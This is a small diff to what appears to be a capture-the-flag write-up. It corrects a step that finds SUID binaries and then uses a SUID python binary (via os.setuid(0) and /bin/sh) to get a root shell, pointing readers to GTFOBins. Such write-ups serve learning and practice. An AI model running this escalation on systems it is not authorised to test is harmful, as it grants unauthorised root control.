@@ -138,10 +138,10 @@ find / -user root -perm /4000
 <big> Find a form to escalate your privileges. </big>
 <br><p2> Answer: <a href="https://gtfobins.github.io/">gtfobins</a>
 
-<br><big> * I will use **setuid** command </big> 
+<br><big> * Make sure to use **cd /usr/bin** before **python** and dont forgot **./** </big> 
 
 ```
- cd usr/bin
+ cd /usr/bin
 ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
